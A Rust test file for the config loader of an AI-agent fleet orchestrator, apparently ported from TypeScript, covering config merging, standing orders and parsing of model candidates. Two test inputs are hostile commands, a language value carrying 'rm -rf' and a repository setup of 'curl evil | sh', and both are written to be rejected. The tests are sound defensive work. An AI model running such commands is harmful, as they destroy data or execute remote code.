//! The fleet's config, standing orders and spawn candidates: from `server/fleet/config.test.ts`,
//! each test naming its `it`, and `parseCandidate` (`server/fleet/orchestrator.ts:191`) with the
//! values TypeScript returned for the same entries. Every test names its own user folder under
//! the system's temporary folder, so none reads the person's `~/.config/herdr-fleet`.

use std::ffi::OsStr;
use std::fs;
use std::hash::{BuildHasher, Hasher, RandomState};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, Ordering};

use herdr_fleet_orchestrator::config::{
    Candidate, CandidateEntry, FleetConfig, ModelPolicy, ProjectConfig, RoleOverride, load_config,
    load_standing_orders, merge_config, parse_candidate, parse_thinking_level,
    require_thinking_level, role_candidates, user_fleet_dir,
};
use protocol::{FleetAgentKind, ThinkingLevel};
use serde_json::{Map, Value, json};

/// A new folder no other test uses, removed when the test ends however it ends.
struct Root(PathBuf);

impl Root {
    fn new() -> Self {
        static COUNTER: AtomicU64 = AtomicU64::new(0);
        loop {
            let mut hasher = RandomState::new().build_hasher();
            hasher.write_u64(COUNTER.fetch_add(1, Ordering::Relaxed));
            let root = std::env::temp_dir().join(format!("fleet-config-{:016x}", hasher.finish()));
            match fs::create_dir(&root) {
                Ok(()) => return Root(root),
                Err(error) if error.kind() == std::io::ErrorKind::AlreadyExists => continue,
                Err(error) => panic!("{}: {error}", root.display()),
            }
        }
    }
}

impl Drop for Root {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

/// A user config folder and a project folder below a repository with `.herdr-fleet/fleet.json`,
/// as config.test.ts's `fixture`.
struct Fixture {
    _root: Root,
    user_dir: PathBuf,
    cwd: PathBuf,
}

fn fixture(user: Option<&str>, project: Option<&str>) -> Fixture {
    let root = Root::new();
    let user_dir = root.0.join("user");
    let repo = root.0.join("repo");
    fs::create_dir_all(&user_dir).unwrap();
    fs::create_dir_all(repo.join(".herdr-fleet")).unwrap();
    fs::create_dir_all(repo.join("src").join("deep")).unwrap();
    if let Some(user) = user {
        fs::write(user_dir.join("fleet.json"), user).unwrap();
    }
    if let Some(project) = project {
        fs::write(repo.join(".herdr-fleet").join("fleet.json"), project).unwrap();
    }
    Fixture {
        _root: root,
        user_dir,
        cwd: repo.join("src").join("deep"),
    }
}

fn object(value: Value) -> Map<String, Value> {
    match value {
        Value::Object(map) => map,
        other => panic!("not an object: {other}"),
    }
}

fn load(fixture: &Fixture, warnings: &mut Vec<String>) -> FleetConfig {
    load_config(&fixture.cwd, warnings, &fixture.user_dir)
}

// config.test.ts: "keeps the defaults, silently, when there are no config files"
#[test]
fn keeps_the_defaults_silently_when_there_are_no_config_files() {
    let fixture = fixture(None, None);
    let mut warnings = Vec::new();
    assert_eq!(load(&fixture, &mut warnings), FleetConfig::default());
    assert_eq!(warnings, Vec::<String>::new());
    // DEFAULT_CONFIG in config.ts
    let defaults = FleetConfig::default();
    assert_eq!(
        (
            defaults.max_concurrent,
            defaults.max_depth,
            defaults.recent_read_lines,
            defaults.default_wait_timeout_ms
        ),
        (6.0, 3.0, 160.0, 120_000.0)
    );
    assert_eq!(
        (defaults.close_on_settle, defaults.autonomous),
        (true, false)
    );
    assert_eq!(
        (
            defaults.max_used_percent,
            defaults.rate_limit_cooldown_minutes
        ),
        (90.0, 60.0)
    );
    assert!(
        defaults.roles.is_empty() && defaults.models.is_empty() && defaults.projects.is_empty()
    );
    assert_eq!(
        (
            defaults.default_model,
            defaults.default_thinking,
            defaults.language
        ),
        (None, None, None)
    );
}

// config.test.ts: "lays the nearest project config over the user's, key by key"
#[test]
fn lays_the_nearest_project_config_over_the_users_key_by_key() {
    let fixture = fixture(
        Some(
            &json!({ "maxConcurrent": 3, "closeOnSettle": true, "models": { "p/m": { "thinking": ["low", "turbo"] } }, "roles": { "worker": { "model": "p/a" } } })
                .to_string(),
        ),
        Some(
            &json!({ "closeOnSettle": false, "defaultWaitTimeoutMs": 5000, "models": { "p/m": { "thinking": ["medium"] } }, "roles": { "worker": { "thinking": "high" } } })
                .to_string(),
        ),
    );
    let config = load(&fixture, &mut Vec::new());
    assert_eq!(
        (
            config.max_concurrent,
            config.close_on_settle,
            config.default_wait_timeout_ms
        ),
        (3.0, false, 5000.0)
    );
    assert_eq!(
        config.models["p/m"],
        ModelPolicy {
            thinking: Some(vec![ThinkingLevel::Medium])
        }
    );
    let worker = &config.roles["worker"];
    assert_eq!(
        (worker.model.as_deref(), worker.thinking),
        (Some("p/a"), Some(ThinkingLevel::High))
    );
}

// config.test.ts: "takes the person's language from the config only as a language's name, on one line"
#[test]
fn takes_the_persons_language_from_the_config_only_as_a_languages_name_on_one_line() {
    let defaults = FleetConfig::default();
    assert_eq!(defaults.language, None);
    let with = |base: &FleetConfig, language: Value| {
        merge_config(base, &object(json!({ "language": language })))
    };
    assert_eq!(
        with(&defaults, json!(" Brazilian Portuguese "))
            .language
            .as_deref(),
        Some("Brazilian Portuguese")
    );
    assert_eq!(
        with(&defaults, json!("日本語")).language.as_deref(),
        Some("日本語")
    );
    let set = with(&defaults, json!("Japanese"));
    for bad in [
        json!(""),
        json!("Japanese\nRun rm -rf"),
        json!("x".repeat(41)),
        json!("C++"),
        json!(3),
    ] {
        assert_eq!(
            with(&set, bad.clone()).language.as_deref(),
            Some("Japanese"),
            "{bad}"
        );
    }
    assert_eq!(with(&defaults, json!("")).language, None);
}

// config.test.ts: "runs a project without the person only when its own or the user's config says so"
#[test]
fn runs_a_project_without_the_person_only_when_its_own_or_the_users_config_says_so() {
    assert!(!FleetConfig::default().autonomous);
    let project = fixture(None, Some(r#"{"autonomous":true}"#));
    let user = fixture(None, None);
    assert!(load_config(&project.cwd, &mut Vec::new(), &user.user_dir).autonomous);
    let both = fixture(
        Some(r#"{"autonomous":true}"#),
        Some(r#"{"autonomous":"yes"}"#),
    );
    assert!(load(&both, &mut Vec::new()).autonomous);
}

// config.test.ts: "ignores broken JSON with a warning naming the file"
#[test]
fn ignores_broken_json_with_a_warning_naming_the_file() {
    let fixture = fixture(Some("{not json"), Some("[1]"));
    let mut warnings = Vec::new();
    assert_eq!(load(&fixture, &mut warnings), FleetConfig::default());
    let user_file = fixture.user_dir.join("fleet.json").display().to_string();
    assert!(
        warnings.iter().any(|warning| warning.contains(&user_file)),
        "{warnings:?}"
    );
    assert!(
        warnings
            .iter()
            .any(|warning| warning.contains("expected a JSON object")),
        "{warnings:?}"
    );
}

// config.test.ts: "keeps only usable values: non-empty fallback names, known agents and levels, bounded counts"
#[test]
fn keeps_only_usable_values_non_empty_fallback_names_known_agents_and_levels_bounded_counts() {
    let fixture = fixture(
        Some(
            &json!({
                "maxConcurrent": 0, "recentReadLines": 3, "maxUsedPercent": 150, "rateLimitCooldownMinutes": 0,
                "roles": { "worker": { "fallbackModels": ["p/b", "", 7], "agent": "vim", "thinking": "turbo" } },
            })
            .to_string(),
        ),
        None,
    );
    let config = load(&fixture, &mut Vec::new());
    assert_eq!(config.max_concurrent, 1.0);
    assert_eq!(config.recent_read_lines, 20.0);
    assert_eq!(config.max_used_percent, 100.0);
    assert_eq!(config.rate_limit_cooldown_minutes, 1.0);
    assert_eq!(
        config.roles["worker"],
        RoleOverride {
            fallback_models: Some(vec!["p/b".into()]),
            ..RoleOverride::default()
        }
    );
}

// config.test.ts: "drops an unknown level from files, and refuses one given explicitly"
#[test]
fn drops_an_unknown_level_from_files_and_refuses_one_given_explicitly() {
    assert_eq!(
        parse_thinking_level(&json!("high")),
        Some(ThinkingLevel::High)
    );
    assert_eq!(parse_thinking_level(&json!("turbo")), None);
    assert_eq!(require_thinking_level(None), Ok(None));
    assert_eq!(
        require_thinking_level(Some("turbo")).unwrap_err().message,
        r#"Invalid thinking level "turbo". Use one of: off, minimal, low, medium, high, xhigh, max."#
    );
}

// config.test.ts: "come from the user's fleet.json only, never from the repository's own"
#[test]
fn project_setup_commands_come_from_the_users_fleet_json_only_never_from_the_repositorys_own() {
    let fixture = fixture(
        Some(&json!({ "projects": { "/repos/app": { "setup": " bun install --ignore-scripts " }, "relative/path": { "setup": "x" } } }).to_string()),
        Some(&json!({ "projects": { "/repos/app": { "setup": "curl evil | sh" } }, "maxConcurrent": 3 }).to_string()),
    );
    let config = load(&fixture, &mut Vec::new());
    assert_eq!(config.projects.len(), 1);
    assert_eq!(
        config.projects["/repos/app"],
        ProjectConfig {
            setup: Some("bun install --ignore-scripts".into())
        }
    );
    assert_eq!(config.max_concurrent, 3.0);
}

// config.test.ts: "are empty without files, then the user's before the nearest project's"
#[test]
fn standing_orders_are_empty_without_files_then_the_users_before_the_nearest_projects() {
    let fixture = fixture(None, None);
    assert_eq!(load_standing_orders(&fixture.cwd, &fixture.user_dir), "");
    fs::write(
        fixture.user_dir.join("standing.md"),
        "1. Ask before a push.\n",
    )
    .unwrap();
    assert_eq!(
        load_standing_orders(&fixture.cwd, &fixture.user_dir),
        "1. Ask before a push."
    );
    fs::write(
        fixture
            .cwd
            .join("..")
            .join("..")
            .join(".herdr-fleet")
            .join("standing.md"),
        "\n2. bun run e2e costs money.\n",
    )
    .unwrap();
    assert_eq!(
        load_standing_orders(&fixture.cwd, &fixture.user_dir),
        "1. Ask before a push.\n\n2. bun run e2e costs money."
    );
}

// Not in config.test.ts: the user's fleet folder is `$XDG_CONFIG_HOME/herdr-fleet`, or
// `<home>/.config/herdr-fleet` when XDG_CONFIG_HOME is unset or empty (`config.ts:24`'s `||`).
#[test]
fn finds_the_users_fleet_folder_under_xdg_config_home() {
    let home = Path::new("/home/someone");
    assert_eq!(
        user_fleet_dir(Some(OsStr::new("/tmp/xdg")), home),
        Path::new("/tmp/xdg/herdr-fleet")
    );
    assert_eq!(
        user_fleet_dir(Some(OsStr::new("")), home),
        Path::new("/home/someone/.config/herdr-fleet")
    );
    assert_eq!(
        user_fleet_dir(None, home),
        Path::new("/home/someone/.config/herdr-fleet")
    );
}

// Not in config.test.ts: values a later config sets replace a lower one's key by key; a role or
// model whose value is not an object changes nothing; a project's path is resolved; a project
// setup that is blank leaves the lower one's.
#[test]
fn merges_roles_models_and_projects_key_by_key() {
    let base = merge_config(
        &FleetConfig::default(),
        &object(json!({
            "defaultModel": "p/x", "defaultThinking": "low", "maxDepth": 2.7,
            "roles": { "lead": { "agent": "codex", "worktree": true } },
            "models": { "p/m": { "thinking": ["high"] } },
            "projects": { "/repos/app/": { "setup": "make" } },
        })),
    );
    assert_eq!(
        (
            base.default_model.as_deref(),
            base.default_thinking,
            base.max_depth
        ),
        (Some("p/x"), Some(ThinkingLevel::Low), 2.0)
    );
    assert_eq!(
        base.projects["/repos/app"],
        ProjectConfig {
            setup: Some("make".into())
        }
    );
    let next = merge_config(
        &base,
        &object(json!({
            "defaultThinking": "turbo",
            "roles": { "lead": { "spawning": false }, "odd": 3 },
            "models": { "p/m": 7, "p/n": { "thinking": "high" } },
            "projects": { "/repos/x/../app": { "setup": "  " } },
        })),
    );
    assert_eq!(next.default_thinking, Some(ThinkingLevel::Low));
    assert_eq!(
        next.roles["lead"],
        RoleOverride {
            agent: Some(FleetAgentKind::Codex),
            worktree: Some(true),
            spawning: Some(false),
            ..RoleOverride::default()
        }
    );
    assert_eq!(next.roles["odd"], RoleOverride::default());
    assert_eq!(
        next.models["p/m"],
        ModelPolicy {
            thinking: Some(vec![ThinkingLevel::High])
        }
    );
    assert_eq!(next.models["p/n"], ModelPolicy { thinking: None });
    assert_eq!(
        next.projects["/repos/app"],
        ProjectConfig {
            setup: Some("make".into())
        }
    );
}

// Not in config.test.ts: `parseCandidate` (`orchestrator.ts:191`). Each expected value is what
// TypeScript returned for the entry with the role's CLI pi: `<agent>:<model>` names another CLI
// (case matters), a model's `:level` stays with the model, and anything else is a model of pi.
#[test]
fn parses_a_candidate_entry_as_typescript_does() {
    let candidate = |agent: FleetAgentKind, model: Option<&str>| Candidate {
        agent,
        model: model.map(str::to_owned),
    };
    let cases: [(Option<&str>, Candidate); 10] = [
        (None, candidate(FleetAgentKind::Pi, None)),
        (Some(""), candidate(FleetAgentKind::Pi, Some(""))),
        (Some("gpt-6"), candidate(FleetAgentKind::Pi, Some("gpt-6"))),
        (
            Some("codex:gpt-6:high"),
            candidate(FleetAgentKind::Codex, Some("gpt-6:high")),
        ),
        (Some("codex:"), candidate(FleetAgentKind::Codex, None)),
        (Some(":x"), candidate(FleetAgentKind::Pi, Some(":x"))),
        (
            Some("vim:model"),
            candidate(FleetAgentKind::Pi, Some("vim:model")),
        ),
        (Some("p/a:b"), candidate(FleetAgentKind::Pi, Some("p/a:b"))),
        (
            Some("claude:opus"),
            candidate(FleetAgentKind::Claude, Some("opus")),
        ),
        (
            Some("Codex:x"),
            candidate(FleetAgentKind::Pi, Some("Codex:x")),
        ),
    ];
    for (entry, expected) in cases {
        assert_eq!(
            parse_candidate(entry, FleetAgentKind::Pi),
            expected,
            "{entry:?}"
        );
    }
}

// Not in config.test.ts: a role's candidates in the order the orchestrator tries them
// (`orchestrator.ts:451`, `settings.ts:116`): the primary, then the fallbacks other than it.
#[test]
fn lists_a_roles_candidates_primary_first_without_repeating_it() {
    let entry = |entry: Option<&str>, agent: FleetAgentKind, model: Option<&str>| CandidateEntry {
        entry: entry.map(str::to_owned),
        agent,
        model: model.map(str::to_owned),
    };
    assert_eq!(
        role_candidates(
            FleetAgentKind::Claude,
            Some("opus"),
            &["codex:".into(), "opus".into(), "sonnet".into()]
        ),
        vec![
            entry(Some("opus"), FleetAgentKind::Claude, Some("opus")),
            entry(Some("codex:"), FleetAgentKind::Codex, None),
            entry(Some("sonnet"), FleetAgentKind::Claude, Some("sonnet")),
        ]
    );
    // no primary model: the CLI's default first, and no fallback is taken for it
    assert_eq!(
        role_candidates(FleetAgentKind::Pi, None, &["p/a".into()]),
        vec![
            entry(None, FleetAgentKind::Pi, None),
            entry(Some("p/a"), FleetAgentKind::Pi, Some("p/a"))
        ]
    );
}

// Not in config.test.ts: TypeScript's `loadConfig` reads the project's file before the user's
// (`config.ts:120-121`), so with both broken Bun 1.4.4 printed the warnings
// ["fleet: ignoring <repo>/.herdr-fleet/fleet.json: expected a JSON object",
//  "fleet: ignoring invalid JSON in <user>/fleet.json: JSON Parse error: Expected '}'"].
#[test]
fn warns_about_the_projects_file_before_the_users() {
    let fixture = fixture(Some("{not json"), Some("[1]"));
    let mut warnings = Vec::new();
    load(&fixture, &mut warnings);
    let repo = fixture.cwd.parent().unwrap().parent().unwrap();
    let project = repo.join(".herdr-fleet").join("fleet.json");
    assert_eq!(warnings.len(), 2, "{warnings:?}");
    assert_eq!(
        warnings[0],
        format!(
            "fleet: ignoring {}: expected a JSON object",
            project.display()
        )
    );
    let user = format!(
        "fleet: ignoring invalid JSON in {}: ",
        fixture.user_dir.join("fleet.json").display()
    );
    assert!(warnings[1].starts_with(&user), "{warnings:?}");
}

// Not in config.test.ts: `userFleetDir` builds the folder with `path.join`, which folds `.`, `..`
// and repeated slashes and keeps a relative path relative. Node printed these for
// join("/tmp//x/../y/", "herdr-fleet"), join("x/./../../y", "herdr-fleet"),
// join(join("/home/a/../b", ".config"), "herdr-fleet") and join("/..//../z", "herdr-fleet").
#[test]
fn folds_the_users_fleet_folder_as_node_joins_it() {
    let xdg = |value: &str| user_fleet_dir(Some(OsStr::new(value)), Path::new("/unused"));
    assert_eq!(xdg("/tmp//x/../y/"), Path::new("/tmp/y/herdr-fleet"));
    assert_eq!(xdg("x/./../../y"), Path::new("../y/herdr-fleet"));
    assert_eq!(xdg("/..//../z"), Path::new("/z/herdr-fleet"));
    assert_eq!(
        user_fleet_dir(None, Path::new("/home/a/../b")),
        Path::new("/home/b/.config/herdr-fleet")
    );
}

// Not in config.test.ts: a count of -0 is 0, not -0: in Node, Math.max(0, Math.floor(-0)) is +0
// (Object.is(Math.max(0, Math.floor(-0)), -0) printed false), and JSON writes 0.
#[test]
fn reads_a_count_of_minus_zero_as_zero() {
    for text in [r#"{"maxDepth": -0}"#, r#"{"maxDepth": -0.0}"#] {
        let raw: Map<String, Value> = serde_json::from_str(text).unwrap();
        let config = merge_config(&FleetConfig::default(), &raw);
        assert_eq!(
            serde_json::to_string(&json!(config.max_depth)).unwrap(),
            "0.0",
            "{text}"
        );
        assert!(config.max_depth.is_sign_positive(), "{text}");
    }
}
